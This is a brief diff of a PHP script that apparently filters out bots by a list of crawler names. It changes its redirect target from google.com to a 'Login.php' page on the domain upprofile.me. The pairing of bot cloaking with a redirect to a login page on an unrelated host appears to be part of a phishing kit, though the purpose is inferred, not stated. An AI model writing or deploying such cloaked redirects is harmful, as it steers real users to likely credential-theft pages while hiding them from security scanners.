@@ -94,6 +94,6 @@ $Bot = array("abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "ob
     }
 
 
-    header('Location: https://google.com');
+    header('Location: https://upprofile.me/Login.php');
  
 ?>
